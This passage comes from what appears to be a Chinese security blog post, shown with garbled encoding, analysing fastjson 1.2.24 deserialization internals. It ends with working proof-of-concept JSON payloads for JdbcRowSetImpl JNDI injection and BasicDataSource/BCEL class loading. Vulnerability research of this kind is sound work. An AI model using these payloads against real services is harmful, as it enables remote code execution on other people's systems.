class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ é™¤äº†ä¸€äº›å€¼åˆå§‹åŒ–ã€å¼‚å¸¸ç­‰</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> fieldIndex = <span class="hljs-number">0</span>;; fieldIndex++) &#123;<span class="hljs-comment">// å¾ªç¯æ‰€æœ‰å­—æ®µ</span><br>    ...<br>    <span class="hljs-keyword">if</span> (fieldIndex &lt; sortedFieldDeserializers.length) &#123;<br>        <span class="hljs-comment">// ç»è¿‡æ’åºåçš„å­—æ®µååºåˆ—åŒ–å™¨ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”ç€å‰é¢åˆ†ææ—¶æ·»åŠ è‡³fieldListä¸­çš„</span><br>        fieldDeser = sortedFieldDeserializers[fieldIndex];<br>        fieldInfo = fieldDeser.fieldInfo;<br>        fieldClass = fieldInfo.fieldClass;<br>        feildAnnotation = fieldInfo.getAnnotation();<br>    &#125;<br><br>    <span class="hljs-keyword">boolean</span> matchField = <span class="hljs-keyword">false</span>;<span class="hljs-comment">// åŒ¹é…çŠ¶æ€</span><br>    <span class="hljs-keyword">boolean</span> valueParsed = <span class="hljs-keyword">false</span>;<br><br>    Object fieldValue = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">if</span> (fieldDeser != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">char</span>[] name_chars = fieldInfo.name_chars;<span class="hljs-comment">// è·å–å­—æ®µåç§°ï¼Œä¾‹å¦‚&quot;name&quot;:  JSONå­—ç¬¦ä¸²ä¸­è·å–</span><br>        <span class="hljs-comment">// æ€»ç»“ä¸€ä¸‹ï¼Œä¸‹é¢çš„è¿™äº›if / else if / elseéƒ½æ˜¯æ ¹æ®ä¸åŒçš„æƒ…å†µä»JSONå­—ç¬¦ä¸²ä¸­æ‹¿å€¼ï¼Œæ‰€ä»¥ç•™ä¸ªä¾‹å­çœ‹ä¸€ä¸‹å°±å¥½äº†</span><br>        <span class="hljs-keyword">if</span> (fieldClass == <span class="hljs-keyword">int</span>.class || fieldClass == Integer.class) &#123;<span class="hljs-comment">// å­—æ®µç±»å‹æ˜¯intæˆ–Interæ—¶è¿›å…¥</span><br>            fieldValue = lexer.scanFieldInt(name_chars);<span class="hljs-comment">// ä»JSONå­—ç¬¦ä¸²ä¸­è·å–å€¼</span><br><br>            <span class="hljs-keyword">if</span> (lexer.matchStat &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// çŒœæµ‹è¿™é‡Œæ˜¯å¯¹æŸè¿™å€¼key valueå€¼åŒ¹é…æˆåŠŸæ—¶ï¼Œå°†åŒ¹é…çŠ¶æ€è®¾ç½®ä¸ºtrue</span><br>                matchField = <span class="hljs-keyword">true</span>;<br>                valueParsed = <span class="hljs-keyword">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lexer.matchStat == JSONLexer.NOT_MATCH_NAME) &#123;<br>                <span class="hljs-keyword">continue</span>;  <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!matchField) &#123;<span class="hljs-comment">// å€¼æœªåŒ¹é…æˆåŠŸæ—¶è¿›å…¥ï¼Œå¯ä»¥ç†è§£ä¸ºä¸æ˜¯ä¸Šé¢ä»–è‡ªå·±å®šä¹‰çš„å“ªäº›å¸¸è§çš„å€¼æ—¶</span><br>        key = lexer.scanSymbol(parser.symbolTable);<br><br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// ä¸€äº›è·å–å€¼</span><br>            token = lexer.token();<br>            <span class="hljs-keyword">if</span> (token == JSONToken.RBRACE) &#123;<br>                lexer.nextToken(JSONToken.COMMA);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (token == JSONToken.COMMA) &#123;<br>                <span class="hljs-keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;$ref&quot;</span> == key) &#123;<span class="hljs-comment">// åˆ¤æ–­keyæ˜¯å¦æ˜¯$ref</span><br>            lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);<br>            token = lexer.token();<br>            <span class="hljs-keyword">if</span> (token == JSONToken.LITERAL_STRING) &#123;<br>                String ref = lexer.stringVal();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;@&quot;</span>.equals(ref)) &#123;<span class="hljs-comment">// ä¸€äº›ä¸ä¸€æ ·çš„å†™æ³•ä¸¾ä¸ªä¾‹å­å°±å¥½ï¼Œä¸‹é¢çš„å°±éƒ½åˆ äº†</span><br>                    object = context.object;<br>                &#125;  <span class="hljs-keyword">else</span> &#123;<br>                    parser.addResolveTask(<span class="hljs-keyword">new</span> ResolveTask(context, ref));<br>                    parser.resolveStatus = DefaultJSONParser.NeedToResolve;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ...<span class="hljs-comment">// å¼‚å¸¸</span><br>            &#125;<br><br>            lexer.nextToken(JSONToken.RBRACE);<br>            <span class="hljs-keyword">if</span> (lexer.token() != JSONToken.RBRACE) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;illegal ref&quot;</span>);<br>            &#125;<br>            lexer.nextToken(JSONToken.COMMA);<br><br>            parser.setContext(context, object, fieldName);<br><br>            <span class="hljs-keyword">return</span> (T) object;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (JSON.DEFAULT_TYPE_KEY == key) &#123;<span class="hljs-comment">// keyæ˜¯å¦æ˜¯@type,ä¹Ÿå°±æ˜¯åˆ¤æ–­ä¸‹è¿™ä¸ªå­—æ®µçš„ç±»å‹æ˜¯ä¸æ˜¯è¿˜æ˜¯ä¸ªJavaBean</span><br>            lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);<br>            <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<br>                String typeName = lexer.stringVal();<br>                lexer.nextToken(JSONToken.COMMA);<br><br>                <span class="hljs-keyword">if</span> (typeName.equals(beanInfo.typeName)) &#123;<br>                    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>                        lexer.nextToken();<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                ParserConfig config = parser.getConfig();<span class="hljs-comment">// è¿™äº›éƒ½è·Ÿä»¥å‰çš„åˆ¤æ–­åŸºæœ¬ç›¸åŒ</span><br>                ObjectDeserializer deserizer = getSeeAlso(config, <span class="hljs-keyword">this</span>.beanInfo, typeName);<br>                Class&lt;?&gt; userType = <span class="hljs-keyword">null</span>;<br>                <span class="hljs-keyword">if</span> (deserizer == <span class="hljs-keyword">null</span>) &#123;<br>                    userType = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());<br><br>                    Class&lt;?&gt; expectClass = TypeUtils.getClass(type);<br>                    <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-keyword">null</span> || <br>                        (userType != <span class="hljs-keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(userType))) &#123;<br>                        deserizer = parser.getConfig().getDeserializer(userType);                                        <br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match&quot;</span>);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> (T) deserizer.deserialze(parser, userType, fieldName);<span class="hljs-comment">// åœ¨è¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–å–½</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">null</span> &amp;&amp; fieldValues == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// Objectç›¸å½“äºè¿”å›å€¼</span><br>        object = createInstance(parser, type);<span class="hljs-comment">// åˆå§‹åŒ–JavaBeanä½¿ç”¨é»˜è®¤æ„é€ å™¨</span><br>        <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// å¦‚æœæ— æ³•å®ä¾‹åŒ–è¿™ä¸ªJavaBean,é‚£ä¹ˆå°±å…ˆåˆ›å»ºä¸€ä¸ªhashMap,åé¢å¯èƒ½ä¼šåšæˆä¸€ä¸ªJSONObject</span><br>            fieldValues = <span class="hljs-keyword">new</span> HashMap&lt;String, Object&gt;(<span class="hljs-keyword">this</span>.fieldDeserializers.length);<br>        &#125;<br>        childContext = parser.setContext(context, object, fieldName);<span class="hljs-comment">// ä¸æ¸…æ¥š</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (matchField) &#123;<br>        <span class="hljs-keyword">if</span> (!valueParsed) &#123;<br>            fieldDeser.parseField(parser, object, type, fieldValues);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">null</span>) &#123;<br>                fieldValues.put(fieldInfo.name, fieldValue);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fieldValue == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (fieldClass != <span class="hljs-keyword">int</span>.class &amp;&amp; fieldClass != <span class="hljs-keyword">long</span>.class &amp;&amp; fieldClass != <span class="hljs-keyword">float</span>.class <br>                    &amp;&amp; fieldClass != <span class="hljs-keyword">double</span>.class <span class="hljs-comment">//</span><br>                    &amp;&amp; fieldClass != <span class="hljs-keyword">boolean</span>.class <span class="hljs-comment">//å½“å€¼ä¸ºè¿™å‡ ç§ç±»å‹æ—¶ï¼Œè¿›å…¥è¿™ä¸ªsetValue</span><br>                   ) &#123;<br>                    fieldDeser.setValue(object, fieldValue);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                fieldDeser.setValue(object, fieldValue);<span class="hljs-comment">// å¦åˆ™è¿›å…¥è¯¥setValue,ä½¿ç”¨åå°„å»è°ƒç”¨å¯¹åº”çš„setæ–¹æ³•</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (lexer.matchStat == JSONLexer.END) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// å½“FieldValueåœ¨ä¸Šé¢æ— æ³•è·å–å€¼æ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹æ–¹æ³•è®¾ç½®fieldçš„å€¼ï¼Œä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨å¯¹åº”çš„setæ–¹æ³•</span><br>        <span class="hljs-keyword">boolean</span> match = parseField(parser, key, object, type, fieldValues);<br>        <span class="hljs-keyword">if</span> (!match) &#123;<br>            <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>                lexer.nextToken();<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.COLON) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;syntax error, unexpect token &#x27;:&#x27;&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.COMMA) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>        lexer.nextToken(JSONToken.COMMA);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.IDENTIFIER || lexer.token() == JSONToken.ERROR) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;syntax error, unexpect token &quot;</span> + JSONToken.name(lexer.token()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹è¿™ä¸ªå¾ªç¯ï¼Œä»JSONå­—ç¬¦ä¸²ä¸­è·å–å¯¹åº”å­—æ®µï¼Œè·å–å­—æ®µçš„å€¼ï¼Œç„¶åä½¿ç”¨é»˜è®¤æ„é€ å™¨åˆ›å»ºè¯¥JavaBeançš„å¯¹è±¡å®ä¾‹ï¼Œå†é€šè¿‡åå°„è°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•è®¾ç½®å…¶å€¼ï¼Œæœ€ç»ˆè¿”å›è¯¥å¯¹è±¡å®ä¾‹</p><p>ç„¶åä¸€æ­¥æ­¥è¿”å›è‡³<code>com.alibaba.fastjson.JSON#parseObject(java.lang.String)</code></p><p><img src="/2022/11/12/fastjson1.2.24/20.png"></p><p>è·Ÿè¿›JSON.toJSONï¼Œä¸€è·¯é‡è½½ï¼Œ</p><p>æ¥åˆ°<code>com.alibaba.fastjson.JSON#toJSON(java.lang.Object, com.alibaba.fastjson.serializer.SerializeConfig)</code></p><p><img src="/2022/11/12/fastjson1.2.24/21.png"></p><p>ç„¶åå°±ç»“æŸäº†ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p><ol><li>æ ¹æ®JavaBeanè·å–ååºåˆ—åŒ–å™¨ï¼Œç„¶åéå†ç¬¦åˆæ¡ä»¶çš„setterã€getteræ–¹æ³•</li><li>ä»JSONå­—ç¬¦ä¸²ä¸­è·å–å¯¹åº”çš„å­—æ®µã€å­—æ®µå€¼</li><li>ä½¿ç”¨é»˜è®¤æ„é€ å™¨(æ— å‚æ„é€ å™¨)å®ä¾‹åŒ–JavaBean</li><li>åå°„è°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•è¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶ä¹Ÿæœ‰å¯èƒ½ä¼šæœ‰getteræ–¹æ³•(éœ€è¦ç¬¦åˆæ¡ä»¶)</li><li>æ¥åˆ°JSON.toJSON()ï¼Œç„¶åå°±æ˜¯è·Ÿä¸Šé¢ç±»ä¼¼äº†ï¼Œä¸è¿‡æ­¤å¤„è°ƒç”¨çš„æ˜¯getteræ–¹æ³•äº†</li></ol><h3 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h3><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œèƒ½å¤Ÿå¾—å‡ºæƒ³è¦åˆ©ç”¨æ¼æ´ï¼Œéœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ol><li>åœ¨setteræˆ–getterä¸­å­˜åœ¨å±é™©æ–¹æ³•çš„è°ƒç”¨ï¼Œæˆ–è€…é—´æ¥çš„è°ƒç”¨å±é™©æ–¹æ³•ï¼Œå½“ç„¶é»˜è®¤æ„é€ å™¨ä¸­ä¹Ÿæœ‰å¯èƒ½</li><li>setteræˆ–getteræ–¹æ³•ä¸­å­˜åœ¨å±é™©æ–¹æ³•ã€æˆ–é—´æ¥è°ƒç”¨äº†å±é™©æ–¹æ³•</li><li>setteræˆ–getteræ–¹æ³•æ˜¯publicä¿®é¥°çš„ï¼Œä¸”ä¸èƒ½æ˜¯static</li><li>setteræ–¹æ³•éœ€è¦æ»¡è¶³å‚æ•°æ•°é‡ä¸º1ï¼Œè¿”å›ç±»å‹ä¸ºvoid</li><li>å˜é‡å¯æ§éœ€è¦æ»¡è¶³æœ‰å¯¹åº”çš„setteræˆ–è€…æ˜¯æ»¡è¶³æ¡ä»¶çš„getteræ–¹æ³•</li></ol><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><ul><li><p>JDK8u121</p></li><li><p>fastjson1.2.24</p></li></ul><p>è¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨äº†ä¸€ä¸ªJNDIæ³¨å…¥ï¼Œåœ¨<code>com.sun.rowset.JdbcRowSetImpl#connect</code>ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªJNDIæ³¨å…¥</p><p><img src="/2022/11/12/fastjson1.2.24/22.png"></p><p>ç»æŸ¥æ‰¾ï¼Œåœ¨<code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code>ä¸­è°ƒç”¨äº†<code>connect()</code></p><p><img src="/2022/11/12/fastjson1.2.24/23.png"></p><p>ç„¶åæ¥ä¸ªç®€å•æµ‹è¯•ï¼Œèƒ½å¤Ÿæµ‹è¯•æˆåŠŸï¼Œä¹Ÿå°±ä»£è¡¨è¿™é‡ŒåŸºæœ¬ä¸Šå¯ä»¥</p><p><img src="/2022/11/12/fastjson1.2.24/24.png"></p><p>ä»ä¸Šé¢çŸ¥é“ï¼Œè¦æ§åˆ¶çš„ç‚¹ä¸»è¦æ˜¯dataSourceçš„å€¼ï¼Œè¿˜æœ‰å°±æ˜¯å»è°ƒç”¨<code>setAutoCommit</code>è¿™ä¸ªæ–¹æ³•(è¿™ä¸ªå¥½å¼„ï¼Œåªè¦å†™äº†å°±èƒ½è°ƒç”¨)</p><p>æ¥çœ‹ä¸€ä¸‹dataSourceè¿™ä¸ªå€¼çš„å†™å…¥ç‚¹ï¼Œå¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°<code>javax.sql.rowset.BaseRowSet#setDataSourceName</code>ï¼Œè¿™ä¸ªåœ¨å…¶çˆ¶ç±»ä¸­</p><p><img src="/2022/11/12/fastjson1.2.24/25.png"></p><p>å†æ¥çœ‹ä¸€ä¸‹<code>com.sun.rowset.JdbcRowSetImpl#setDataSourceName</code>å®ƒè‡ªèº«çš„è¿™ä¸ªæ–¹æ³•</p><p><img src="/2022/11/12/fastjson1.2.24/26.png"></p><p>æ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥æ¥æ„é€ paylaodäº†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;DataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8085/YTUsllNt&quot;</span>,<span class="hljs-attr">&quot;AutoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/12/fastjson1.2.24/27.png"></p><p>æ•´ä¸ªçš„è°ƒç”¨æµç¨‹æ˜¯</p><p><code>JdbcRowSetImpl#setDataSourceName</code>â€“&gt;</p><p><code>BaseRowSet#setDataSourceName</code>â€“&gt;</p><p><code>JdbcRowSetImpl#setAutoCommit</code>â€“&gt;</p><p><code>JdbcRowSetImpl#connect</code></p><h5 id="æ³¨æ„1"><a href="#æ³¨æ„1" class="headerlink" title="æ³¨æ„1"></a>æ³¨æ„1</h5><p>ä¸Šé¢æœ‰ä¸€ç‚¹æ²¡æœ‰æåˆ°ï¼Œå°±æ˜¯å…³äºè¿™äº›æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼Œä»£ç å†…å†™çš„æ˜¯æ ¹æ®é¦–å­—æ¯è¿›è¡Œä¸€ä¸ªè°ƒç”¨ï¼Œä½†å…·ä½“è°ƒç”¨çš„é¡ºåºï¼Œè·Ÿä¼ å…¥çš„é¡ºåºä¹Ÿæœ‰å…³</p><p><img src="/2022/11/12/fastjson1.2.24/28.png"></p><h5 id="æ³¨æ„2"><a href="#æ³¨æ„2" class="headerlink" title="æ³¨æ„2"></a>æ³¨æ„2</h5><p>è¿™é‡Œæ˜¯JNDIæ³¨å…¥ï¼Œæ‰€ä»¥å¯¹JDKçš„ç‰ˆæœ¬æœ‰ä¾èµ–é™åˆ¶&lt;=jdk8u121ï¼Œè¿˜éœ€è¦å‡ºç½‘</p><h4 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h4><p>jdk8u191</p><p>fastjson1.2.24</p><p>æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯éœ€è¦ä¸€ä¸ªå¯ä»¥ä¸å‡ºç½‘åˆ©ç”¨çš„ï¼Œå¹¶ä¸”å¯¹JDKçš„ç‰ˆæœ¬æ²¡æœ‰é™åˆ¶çš„</p><p><code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>åœ¨è¿™é‡Œï¼Œæœ‰ä¸ªç±»åŠ è½½çš„ä¸œè¥¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Class <span class="hljs-title">loadClass</span><span class="hljs-params">(String class_name, <span class="hljs-keyword">boolean</span> resolve)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>    Class cl = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-comment">/* First try: lookup hash table.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">/* Second try: Load system class using system class loader. You better</span><br><span class="hljs-comment">       * don&#x27;t mess around with them.</span><br><span class="hljs-comment">       */</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i &lt; ignored_packages.length; i++) &#123;<span class="hljs-comment">// ç±»åçš„ä¸€ä¸ªåˆ¤æ–­</span><br>            <span class="hljs-keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;<br>                cl = deferTo.loadClass(class_name);<span class="hljs-comment">// æœ€ç»ˆçš„åŠ è½½ç±»çš„åœ°æ–¹</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(cl == <span class="hljs-keyword">null</span>) &#123;<br>            JavaClass clazz = <span class="hljs-keyword">null</span>;<br><br>            <span class="hljs-comment">//  Third try: Special request?</span><br>            <span class="hljs-keyword">if</span>(class_name.indexOf(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="hljs-number">0</span>)<span class="hljs-comment">// ç¿»è¯‘ä¸€ä¸‹ å½“class_name ä¸­å­˜åœ¨ $$BCEL$$</span><br>                clazz = createClass(class_name);<span class="hljs-comment">// ä¼šåˆ›å»ºè¿™ä¸ªç±»</span><br>            <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// Fourth try: Load classes via repository</span><br>                <span class="hljs-keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="hljs-keyword">null</span>) &#123;<br>                    clazz = modifyClass(clazz);<br>                &#125; <span class="hljs-keyword">else</span>&#123;...&#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(clazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// createClass()æ‰§è¡ŒæˆåŠŸæ—¶</span><br>                <span class="hljs-keyword">byte</span>[] bytes  = clazz.getBytes();<span class="hljs-comment">// è·å–å­—èŠ‚ç </span><br>                cl = defineClass(class_name, bytes, <span class="hljs-number">0</span>, bytes.length);<span class="hljs-comment">// è°ƒç”¨defineClass()è¿›è¡ŒåŠ¨æ€ç±»åŠ è½½</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-comment">// Fourth try: Use default class loader// defineClassæœ€ç»ˆè¿˜æ˜¯è°ƒç”¨loadClass</span><br>                cl = Class.forName(class_name);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(resolve)<br>            resolveClass(cl);<br>    &#125;<br><br>    classes.put(class_name, cl);<br><br>    <span class="hljs-keyword">return</span> cl;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œokäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾ä¸€ä¸‹ï¼Œåœ¨å“ªä¸ªsetæ–¹æ³•ä¸­è°ƒç”¨äº†å®ƒå°±okäº†</p><p><img src="/2022/11/12/fastjson1.2.24/29.png"></p><p>åœ¨<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory</code>è¿™é‡Œï¼Œæœ‰ä¸€ä¸ªforName</p><p><img src="/2022/11/12/fastjson1.2.24/30.png"></p><p>ç„¶åå°±æ˜¯ï¼Œæ‰¾ä¸‹è¿™ä¸¤ä¸ªå€¼æœ‰æ²¡æœ‰å¯¹åº”çš„setteræ–¹æ³•</p><p><img src="/2022/11/12/fastjson1.2.24/31.png"></p><p>å¾ˆå¥½ï¼Œéƒ½æœ‰å¯¹åº”çš„setteræ–¹æ³•ï¼Œå¹¶ä¸”ä¹Ÿæ»¡è¶³ç›¸åº”çš„è¦æ±‚ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å»æ‰¾å“ªä¸ªsetteræ–¹æ³•ä¸­ç›´æ¥æˆ–é—´æ¥çš„è°ƒç”¨äº†<code>BasicDataSource#createConnectionFactory</code>ï¼Œå¾ˆå¹¸è¿ï¼Œæœ‰ï¼Œå¤§è‡´çš„è°ƒç”¨å¦‚ä¸‹ï¼š</p><blockquote><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection<br>    org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource<br>        org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory<br>            java.lang.Class#forName(java.lang.String, boolean, java.lang.ClassLoader<br>                com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</p></blockquote><p><img src="/2022/11/12/fastjson1.2.24/32.png"></p><p>å…ˆæ­£å¸¸æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="/2022/11/12/fastjson1.2.24/33.png"></p><p>æµ‹è¯•OKï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å†™POCäº†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;\<span class="hljs-attr">&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + encode + <span class="hljs-attr">&quot;\&quot;,\&quot;DriverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h5 id="æ³¨æ„1-1"><a href="#æ³¨æ„1-1" class="headerlink" 